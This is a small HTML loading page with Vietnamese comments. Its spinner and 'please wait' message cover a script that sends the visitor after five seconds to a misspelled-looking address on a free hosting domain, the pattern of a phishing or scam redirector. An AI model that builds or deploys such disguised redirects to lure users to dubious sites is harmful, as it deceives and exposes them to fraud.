<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Loading...</title>

<style>
body {
    margin: 0;
    height: 100vh;
    background: #f3f4f6;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Segoe UI', sans-serif;
}

.loader-box {
    text-align: center;
}

.spinner {
    width: 40px;
    height: 40px;
    border: 4px solid #e5e7eb;
    border-top: 4px solid #3b82f6;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: auto;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}

.text {
    margin-top: 15px;
    color: #6b7280;
    font-size: 14px;
}
</style>

</head>
<body>

<div class="loader-box">
    <div class="spinner"></div>
    <div class="text">Please wait a moment while the page loads.</div>
</div>

<script>

const redirectUrl = "https://ww.vietteeeee1102.ct.ws/b43543543"; // link đích
const delay = 5000; // thời gian (ms)


setTimeout(() => {
    window.location.href = redirectUrl;
}, delay);
</script>

</body>
</html>
